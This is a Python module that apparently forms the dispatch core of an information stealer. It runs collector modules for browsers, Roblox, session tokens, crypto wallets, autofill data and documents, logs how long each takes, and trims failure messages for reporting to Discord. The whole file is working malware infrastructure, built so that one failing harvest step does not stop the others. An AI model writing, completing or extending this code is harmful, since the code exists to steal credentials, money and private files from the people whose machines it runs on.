"""Collector registry.

One entry per ``SourceConfig`` flag. ``system`` owns three modules, because network
and display inventory are part of the system picture and have no flag of their own.

Every collector obeys the same contract: ``run(out_dir, cfg) -> int``, returning the
number of items written. A collector that raises is logged and counted as zero, so
one broken artifact source cannot take the rest of the run with it.
"""

from __future__ import annotations

import importlib
import time
from pathlib import Path
from typing import Any, Final

from .. import log

# flag on SourceConfig -> module names, in the order they run
_PLAN: Final[tuple[tuple[str, tuple[str, ...]], ...]] = (
    ("system", ("system", "network", "displays")),
    ("browsers", ("browsers", "roblox")),
    ("sessions", ("sessions",)),
    ("wallets", ("wallets",)),
    ("autofill", ("autofill",)),
    ("documents", ("documents",)),
)


def run_all(out_dir: Path, cfg: Any) -> tuple[dict[str, int], dict[str, str]]:
    """Run every enabled collector.

    Returns ``(counts, failures)``: module name -> items written, and module name ->
    the short reason it produced nothing. Two maps rather than one because a zero and a
    crash look identical in a count, and "sessions: 0" is the difference between a
    machine with no tokens and a browser store that refused to be read.
    """
    counts: dict[str, int] = {}
    failures: dict[str, str] = {}
    timings: dict[str, float] = {}
    started = time.perf_counter()

    for flag, modules in _PLAN:
        if not getattr(cfg.sources, flag):
            log.logger.debug("sources: %s disabled", flag)
            continue
        for name in modules:
            written, reason, elapsed = _run_one(name, out_dir, cfg)
            counts[name] = written
            timings[name] = elapsed
            if reason:
                failures[name] = reason

    # A six-minute run needs a number under it. Without this the only way to find the
    # source that owns the time is to run them one at a time by hand.
    if timings:
        slowest = max(timings, key=lambda name: timings[name])
        log.logger.debug(
            "sources: %d modules in %.1f s, slowest %s at %.1f s",
            len(timings),
            time.perf_counter() - started,
            slowest,
            timings[slowest],
        )

    return counts, failures


def _reason(exc: BaseException) -> str:
    """The class name and a trimmed message, because Discord truncates anyway."""
    text = str(exc).strip().splitlines()[0][:80] if str(exc).strip() else ""
    return f"{type(exc).__name__}: {text}" if text else type(exc).__name__


def _run_one(name: str, out_dir: Path, cfg: Any) -> tuple[int, str, float]:
    """Run one collector. Returns items written, a failure reason, and seconds taken."""
    started = time.perf_counter()

    try:
        module = importlib.import_module(f".{name}", __name__)
    except Exception as exc:
        log.logger.exception("sources: %s could not be imported", name)
        return 0, _reason(exc), time.perf_counter() - started

    runner = getattr(module, "run", None)
    if runner is None:
        log.logger.error("sources: %s has no run()", name)
        return 0, "no run()", time.perf_counter() - started

    try:
        written = int(runner(out_dir, cfg))
    except Exception as exc:
        log.logger.exception("sources: %s raised", name)
        elapsed = time.perf_counter() - started
        log.logger.debug("sources: %s failed after %.2f s", name, elapsed)
        return 0, _reason(exc), elapsed

    elapsed = time.perf_counter() - started
    log.logger.debug("sources: %s wrote %d in %.2f s", name, written, elapsed)
    return written, "", elapsed


__all__ = ["run_all"]
